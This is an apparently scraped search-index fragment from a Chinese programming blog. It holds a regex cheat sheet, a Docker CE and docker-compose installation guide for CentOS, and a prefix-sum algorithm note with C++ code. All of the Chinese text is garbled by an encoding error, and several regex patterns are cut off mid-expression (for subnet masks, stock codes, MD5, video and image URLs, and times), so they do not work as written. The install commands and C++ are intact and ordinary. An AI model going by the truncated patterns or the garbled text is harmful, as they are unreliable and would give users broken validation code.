&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^ed2k:\/\/|file|.+|\/$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç£åŠ›é“¾æ¥(å®½æ¾åŒ¹é…)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^magnet:\?xt=urn:btih:[0-9a-fA-F]{40,}.*$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å­ç½‘æ©ç &lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(?:\d{1,2}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linuxæ–‡ä»¶è·¯å¾„&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\/(?:[^\/]+\/)*[^\/]+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linuxæ–‡ä»¶å¤¹è·¯å¾„&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\/(?:[^\/]+\/)*$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;windowæ–‡ä»¶å¤¹è·¯å¾„&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z]:\\(?:\w+\\?)*$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;windowä¸‹æ–‡ä»¶è·¯å¾„&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[a-zA-Z]:\\(?:\w+\\)*\w+\.\w+$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;è‚¡ç¥¨ä»£ç (Aè‚¡)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(s[hz]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;md5æ ¼å¼(32ä½)&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^([a-f\d]{32}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ç‰ˆæœ¬å·, æ ¼å¼ä¸ºX.Y.Z&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\d+(?:\.\d+){2}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;è§†é¢‘(video)é“¾æ¥åœ°å€&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^https?://(.+/)+.+(.(swf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å›¾ç‰‡(image)é“¾æ¥åœ°å€ï¼ˆ&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^https?://(.+/)+.+(.(gif&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;24å°æ—¶åˆ¶æ—¶é—´ï¼ˆHH:mm:ssï¼‰&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(?:[01]\d&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;12å°æ—¶åˆ¶æ—¶é—´ï¼ˆhh:mm:ssï¼‰&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^(?:1[0-2]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;base64æ ¼å¼&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^\s*data:(?:[a-z]+\/[a-z0-9-+.]+(?:;[a-z-]+=[a-z0-9-]+)?)?(?:;base64)?,([a-z0-9!$&amp;amp;&#39;,()*+;=\-._~:@\/?%\s]*?)\s*$/i&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;é“¶è¡Œå¡å·ï¼ˆ10åˆ°30ä½, è¦†ç›–å¯¹å…¬/ç§è´¦æˆ·, å‚è€ƒå¾®ä¿¡æ”¯ä»˜ï¼‰&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;/^[1-9]\d{9,29}$/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mac åœ°å€&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;`/^((([a-f0-9]{2}ğŸ˜ƒ{5})&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
">æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/rong-qi-docker-ce-an-zhuang/"" data-c="
          &lt;h3 id=&#34;moby-docker-ceä¸docker-eeçš„åŒºåˆ«&#34;&gt;mobyã€docker-ceä¸docker-eeçš„åŒºåˆ«&lt;/h3&gt;
&lt;p&gt;æœ€æ—©çš„æ—¶å€™dockerå°±æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œä¸»è¦ç”±dockerå…¬å¸ç»´æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;2017å¹´å¹´åˆï¼Œdockerå…¬å¸å°†åŸå…ˆçš„dockeré¡¹ç›®æ”¹åä¸ºmobyï¼Œå¹¶åˆ›å»ºäº†docker-ceå’Œdocker-eeã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸‰è€…çš„å…³ç³»æ˜¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mobyæ˜¯ç»§æ‰¿äº†åŸå…ˆçš„dockerçš„é¡¹ç›®ï¼Œæ˜¯ç¤¾åŒºç»´æŠ¤çš„çš„å¼€æºé¡¹ç›®ï¼Œè°éƒ½å¯ä»¥åœ¨mobyçš„åŸºç¡€æ‰“é€ è‡ªå·±çš„å®¹å™¨äº§å“&lt;/li&gt;
&lt;li&gt;docker-ceæ˜¯dockerå…¬å¸ç»´æŠ¤çš„å¼€æºé¡¹ç›®ï¼Œæ˜¯ä¸€ä¸ªåŸºäºmobyé¡¹ç›®çš„å…è´¹çš„å®¹å™¨äº§å“&lt;/li&gt;
&lt;li&gt;docker-eeæ˜¯dockerå…¬å¸ç»´æŠ¤çš„é—­æºäº§å“ï¼Œæ˜¯dockerå…¬å¸çš„å•†ä¸šäº§å“ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;moby projectç”±ç¤¾åŒºç»´æŠ¤ï¼Œ docker-ce projectæ˜¯dockerå…¬å¸ç»´æŠ¤ï¼Œdocker-eeæ˜¯é—­æºçš„ã€‚&lt;/p&gt;
&lt;p&gt;è¦ä½¿ç”¨å…è´¹çš„dockerï¼Œä»ç½‘é¡µdocker-ceä¸Šè·å–ã€‚&lt;/p&gt;
&lt;p&gt;è¦ä½¿ç”¨æ”¶è´¹çš„dockerï¼Œä»ç½‘é¡µdocker-eeä¸Šè·å–ã€‚&lt;/p&gt;
&lt;h3 id=&#34;centos&#34;&gt;centos&lt;/h3&gt;
&lt;h4 id=&#34;docker-ce&#34;&gt;docker-ce&lt;/h4&gt;
&lt;p&gt;ä»¥ä¸‹å†…å®¹æ ¹æ® å®˜æ–¹æ–‡æ¡£ ä¿®æ”¹è€Œæ¥ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœä½ ä¹‹å‰å®‰è£…è¿‡ dockerï¼Œè¯·å…ˆåˆ æ‰&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo yum remove docker docker-common docker-selinux docker-engine
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å®‰è£…ä¸€äº›ä¾èµ–&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo yum install -y yum-utils device-mapper-persistent-data lvm2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ ¹æ®ä½ çš„å‘è¡Œç‰ˆä¸‹è½½repoæ–‡ä»¶:&lt;/p&gt;
&lt;p&gt;CentOS/RHEL&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;wget -O /etc/yum.repos.d/docker-ce.repo https://download.docker.com/linux/centos/docker-ce.repo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŠŠè½¯ä»¶ä»“åº“åœ°å€æ›¿æ¢ä¸º TUNA:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo sed -i &#39;s+download.docker.com+mirrors.tuna.tsinghua.edu.cn/docker-ce+&#39; /etc/yum.repos.d/docker-ce.repo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœ€åå®‰è£…:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo yum makecache fast
sudo yum install docker-ce
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;docker-compose&#34;&gt;docker-compose&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -L &amp;quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&amp;quot; -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
&lt;/code&gt;&lt;/pre&gt;
">ã€å®¹å™¨ã€‘docker-ceã€docker-composeå®‰è£…</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-qian-zhui-he/"" data-c="
          &lt;h2 id=&#34;æ•°ç»„å‰ç¼€å’Œ&#34;&gt;æ•°ç»„å‰ç¼€å’Œ&lt;/h2&gt;
&lt;p&gt;ä¾‹é¢˜ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/subarray-sum-equals-k/&#34;&gt;å’Œä¸ºKçš„å­æ•°ç»„&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;/*
æ±‚æ•°ç»„çš„å‰ç¼€å’Œæ•°ç»„pre
ç„¶åæ±‚æ»¡è¶³pre[i]-pre[j]==kçš„ä¸ªæ•°ï¼Œå³ä¸ºç­”æ¡ˆ
åœ¨æ±‚å‰ç¼€å’Œæ—¶è¾¹è®°å½•æ¯ä¸ªå‰ç¼€å’Œå‡ºç°çš„æ¬¡æ•°ï¼Œç”¨mapè®°å½•
é‚£ä¹ˆå¯¹äºä»¥iç»“å°¾çš„æ•°ç»„æ‰¾å‡ºpre[j]=pre[i]-kçš„ä¸ªæ•°ç´¯åŠ èµ·æ¥ã€‚
*/
class Solution {
public:
    int subarraySum(vector&amp;lt;int&amp;gt;&amp;amp; nums, int k) {
        int ans = 0;
        unordered_map&amp;lt;int, int&amp;gt; mmp;
        mmp[0] = 1;
        int pre = 0;

        for(int i = 0; i &amp;lt; nums.size(); i++)
        {
            pre += nums[i];
            ans += mmp[pre - k];
            mmp[pre] += 1;
        }

        return ans;
        
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;a href=&#34;https://leetcode-cn.com/problems/subarray-sums-divisible-by-k/&#34;&gt;å’Œå¯è¢« K æ•´é™¤çš„å­æ•°ç»„&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æˆ‘ä»¬ä»¤ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;nums&lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;nums&lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mo&gt;â€¦&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;nums&lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;P[i] = \textit{nums}[0] + \textit{nums}[1] + \ldots + \textit{nums}[i]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;nums&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;nums&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;minner&#34;&gt;â€¦&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;nums&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚é‚£ä¹ˆæ¯ä¸ªè¿ç»­å­æ•°ç»„çš„å’Œ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mtext mathvariant=&#34;italic&#34;&gt;sum&lt;/mtext&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\textit{sum}(i, j)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord text&#34;&gt;&lt;span class=&#34;mord textit&#34;&gt;sum&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; å°±å¯ä»¥å†™æˆ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;P[j] - P[i-1]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼ˆå…¶ä¸­ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;0 &amp;lt; i &amp;lt; j&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.68354em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69862em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼‰çš„å½¢å¼ã€‚æ­¤æ—¶ï¼Œåˆ¤æ–­å­æ•°ç»„çš„å’Œèƒ½å¦è¢« k æ•´é™¤å°±ç­‰ä»·äºåˆ¤æ–­ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;o&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;d&lt;/mi&gt;&lt;/mrow&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;(P[j] - P[i-1]) \bmod k == 0&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05724em;&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathrm&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathrm&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.05555555555555555em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œæ ¹æ® åŒä½™å®šç†ï¼Œåªè¦ &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;j&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mtext&gt;â€Š&lt;/mtext&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;m&lt;/mi&gt;&lt;mi 